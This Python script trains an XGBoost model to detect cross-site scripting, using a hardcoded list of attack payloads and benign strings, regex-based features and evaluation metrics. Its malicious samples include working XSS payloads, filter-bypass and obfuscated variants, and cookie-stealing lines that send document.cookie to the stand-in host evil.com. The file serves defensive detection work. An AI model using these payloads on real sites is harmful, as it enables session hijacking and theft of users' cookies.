import pandas as pd
import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix
import xgboost as xgb
import joblib
import re
import urllib.parse
import logging
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class XSSDatasetGenerator:
    """Generate XSS dataset for training"""
    
    def __init__(self):
        # Malicious XSS payloads
        self.malicious_payloads = [
            # Basic script injection
            '<script>alert("XSS")</script>',
            '<script>alert(1)</script>',
            '<script>alert(document.cookie)</script>',
            '<script src="http://evil.com/xss.js"></script>',
            
            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror=alert(document.cookie)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<video onerror=alert(1)><source>',
            
            # JavaScript protocol
            'javascript:alert(1)',
            'javascript:alert(document.cookie)',
            'javascript:void(alert(1))',
            
            # Encoded attacks
            '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
            
            # DOM-based
            'document.write("<script>alert(1)</script>")',
            'document.location="javascript:alert(1)"',
            'window.location="javascript:alert(1)"',
            'innerHTML=<img src=x onerror=alert(1)>',
            
            # Advanced attacks
            '<svg><script>alert(1)</script></svg>',
            '<math><mtext></mtext><script>alert(1)</script></math>',
            '<table background="javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            
            # Obfuscated
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<img src=1 onerror=eval(atob("YWxlcnQoMSk="))>',
            
            # Cookie stealing
            '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
            '<img src=x onerror=this.src="http://evil.com/?c="+document.cookie>',
            
            # Filter bypass
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<SCRiPT>alert(1)</SCRiPT>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Data URI
            '<script src="data:text/javascript,alert(1)"></script>',
            '<object data="data:text/html,<script>alert(1)</script>">',
            
            # More variants
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x:alert(alt) onerror=eval(src) alt=1>',
            '<iframe src="javascript:alert(1)">',
            '<form action="javascript:alert(1)"><input type="submit">',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
        ]
        
        # Benign payloads
        self.benign_payloads = [
            # Normal URLs
            'https://example.com',
            'https://example.com/page?id=123',
            'https://example.com/search?q=test',
            'http://localhost:8080',
            
            # Normal queries
            'search term',
            'user input',
            'hello world',
            'test123',
            
            # Email addresses
            'user@example.com',
            'admin@company.org',
            
            # Normal parameters
            'name=John Doe',
            'age=25',
            'city=New York',
            'category=electronics',
            
            # Safe HTML-like content
            'Product <b>Name</b>',
            'Price: $99.99',
            'Contact us at info@example.com',
            
            # Normal text with special chars
            'C++ programming',
            'Math: 2 + 2 = 4',
            'Email: test@test.com',
            
            # File paths
            '/home/user/document.txt',
            'C:\\Users\\Documents\\file.pdf',
            
            # Safe code snippets
            'function add(a, b) { return a + b; }',
            'SELECT * FROM users WHERE id = 1',
            
            # Normal JSON-like
            '{"name": "John", "age": 30}',
            '[1, 2, 3, 4, 5]',
            
            # URLs with parameters
            'https://site.com?param1=value1&param2=value2',
            'https://shop.com/product/12345',
            
            # Normal sentences
            'This is a normal sentence.',
            'How are you today?',
            'Welcome to our website!',
        ]
    
    def generate_variations(self, payloads, count=10):
        """Generate variations of payloads"""
        variations = []
        for payload in payloads:
            variations.append(payload)
            for _ in range(count):
                # Add random variations
                var = payload
                # Random case changes
                if np.random.random() > 0.7:
                    var = ''.join(c.upper() if np.random.random() > 0.5 else c.lower() for c in var)
                # Add spaces
                if np.random.random() > 0.7:
                    var = var.replace('=', ' = ')
                # URL encode randomly
                if np.random.random() > 0.8:
                    var = urllib.parse.quote(var)
                variations.append(var)
        return variations
    
    def create_dataset(self):
        """Create training dataset"""
        # Generate variations
        malicious = self.generate_variations(self.malicious_payloads, 5)
        benign = self.generate_variations(self.benign_payloads, 3)
        
        # Create dataframe
        data = []
        for payload in malicious:
            data.append({'payload': payload, 'label': 1})
        for payload in benign:
            data.append({'payload': payload, 'label': 0})
        
        df = pd.DataFrame(data)
        logger.info(f"Dataset created: {len(df)} samples ({len(malicious)} malicious, {len(benign)} benign)")
        return df


class FeatureExtractor:
    """Extract features from payloads"""
    
    def extract_features(self, payload):
        """Extract features from a single payload"""
        features = {}
        
        # Decode URL encoded strings
        try:
            decoded = urllib.parse.unquote(payload)
        except:
            decoded = payload
        
        # Basic features
        features['length'] = len(payload)
        features['num_special_chars'] = len(re.findall(r'[<>\'\"(){}[\]]', payload))
        features['num_digits'] = len(re.findall(r'\d', payload))
        features['num_spaces'] = payload.count(' ')
        
        # XSS-specific patterns
        features['has_script'] = int(bool(re.search(r'<script', payload, re.I)))
        features['has_javascript'] = int(bool(re.search(r'javascript:', payload, re.I)))
        features['has_onerror'] = int(bool(re.search(r'onerror\s*=', payload, re.I)))
        features['has_onload'] = int(bool(re.search(r'onload\s*=', payload, re.I)))
        features['has_onclick'] = int(bool(re.search(r'onclick\s*=', payload, re.I)))
        features['has_onfocus'] = int(bool(re.search(r'onfocus\s*=', payload, re.I)))
        features['has_onmouseover'] = int(bool(re.search(r'onmouseover\s*=', payload, re.I)))
        features['has_alert'] = int(bool(re.search(r'alert\s*\(', payload, re.I)))
        features['has_eval'] = int(bool(re.search(r'eval\s*\(', payload, re.I)))
        features['has_document_cookie'] = int(bool(re.search(r'document\.cookie', payload, re.I)))
        features['has_document_write'] = int(bool(re.search(r'document\.write', payload, re.I)))
        features['has_window_location'] = int(bool(re.search(r'window\.location', payload, re.I)))
        features['has_iframe'] = int(bool(re.search(r'<iframe', payload, re.I)))
        features['has_embed'] = int(bool(re.search(r'<embed', payload, re.I)))
        features['has_object'] = int(bool(re.search(r'<object', payload, re.I)))
        features['has_svg'] = int(bool(re.search(r'<svg', payload, re.I)))
        features['has_img'] = int(bool(re.search(r'<img', payload, re.I)))
        features['has_base64'] = int(bool(re.search(r'base64', payload, re.I)))
        features['has_data_uri'] = int(bool(re.search(r'data:', payload, re.I)))
        
        # Obfuscation detection
        features['has_hex_encoding'] = int(bool(re.search(r'\\x[0-9a-f]{2}', payload, re.I)))
        features['has_unicode'] = int(bool(re.search(r'\\u[0-9a-f]{4}', payload, re.I)))
        features['has_url_encoding'] = int(bool(re.search(r'%[0-9a-f]{2}', payload, re.I)))
        features['has_html_entity'] = int(bool(re.search(r'&#\d+;', payload)))
        
        # Statistical features
        features['entropy'] = self.calculate_entropy(payload)
        features['uppercase_ratio'] = sum(1 for c in payload if c.isupper()) / max(len(payload), 1)
        features['digit_ratio'] = features['num_digits'] / max(len(payload), 1)
        features['special_char_ratio'] = features['num_special_chars'] / max(len(payload), 1)
        
        # Count dangerous functions
        dangerous_funcs = ['eval', 'alert', 'prompt', 'confirm', 'setTimeout', 'setInterval']
        features['dangerous_func_count'] = sum(payload.lower().count(func) for func in dangerous_funcs)
        
        # HTML tag count
        features['html_tag_count'] = len(re.findall(r'<[^>]+>', payload))
        
        return features
    
    def calculate_entropy(self, text):
        """Calculate Shannon entropy"""
        if not text:
            return 0
        entropy = 0
        for x in range(256):
            p_x = float(text.count(chr(x))) / len(text)
            if p_x > 0:
                entropy += - p_x * np.log2(p_x)
        return entropy
    
    def extract_features_batch(self, payloads):
        """Extract features for multiple payloads"""
        features_list = []
        for payload in payloads:
            features = self.extract_features(payload)
            features_list.append(features)
        return pd.DataFrame(features_list)


def train_model():
    """Train XGBoost model for XSS detection"""
    logger.info("Starting model training...")
    
    # Generate dataset
    generator = XSSDatasetGenerator()
    df = generator.create_dataset()
    
    # Extract features
    extractor = FeatureExtractor()
    X = extractor.extract_features_batch(df['payload'].values)
    y = df['label'].values
    
    logger.info(f"Features extracted: {X.shape[1]} features")
    
    # Split dataset
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )
    
    logger.info(f"Training set: {len(X_train)} samples")
    logger.info(f"Test set: {len(X_test)} samples")
    
    # Scale features
    scaler = StandardScaler()
    X_train_scaled = scaler.fit_transform(X_train)
    X_test_scaled = scaler.transform(X_test)
    
    # Train XGBoost model
    logger.info("Training XGBoost model...")
    model = xgb.XGBClassifier(
        n_estimators=100,
        max_depth=6,
        learning_rate=0.1,
        subsample=0.8,
        colsample_bytree=0.8,
        objective='binary:logistic',
        random_state=42,
        use_label_encoder=False,
        eval_metric='logloss'
    )
    
    model.fit(X_train_scaled, y_train)
    
    # Evaluate model
    y_pred = model.predict(X_test_scaled)
    y_pred_proba = model.predict_proba(X_test_scaled)
    
    accuracy = accuracy_score(y_test, y_pred)
    precision = precision_score(y_test, y_pred)
    recall = recall_score(y_test, y_pred)
    f1 = f1_score(y_test, y_pred)
    
    logger.info("=" * 60)
    logger.info("Model Performance:")
    logger.info(f"Accuracy:  {accuracy:.4f} ({accuracy*100:.2f}%)")
    logger.info(f"Precision: {precision:.4f} ({precision*100:.2f}%)")
    logger.info(f"Recall:    {recall:.4f} ({recall*100:.2f}%)")
    logger.info(f"F1 Score:  {f1:.4f} ({f1*100:.2f}%)")
    logger.info("=" * 60)
    
    # Confusion matrix
    cm = confusion_matrix(y_test, y_pred)
    logger.info("Confusion Matrix:")
    logger.info(f"TN: {cm[0][0]}, FP: {cm[0][1]}")
    logger.info(f"FN: {cm[1][0]}, TP: {cm[1][1]}")
    
    # Feature importance
    feature_importance = pd.DataFrame({
        'feature': X.columns,
        'importance': model.feature_importances_
    }).sort_values('importance', ascending=False)
    
    logger.info("\nTop 10 Most Important Features:")
    logger.info(feature_importance.head(10).to_string(index=False))
    
    # Save model and scaler
    os.makedirs('/models', exist_ok=True)
    joblib.dump(model, '/models/xss_model.pkl')
    joblib.dump(scaler, '/models/scaler.pkl')
    
    logger.info("\nModel and scaler saved to /models/")
    logger.info("Training completed successfully!")
    
    return model, scaler


if __name__ == '__main__':
    train_model()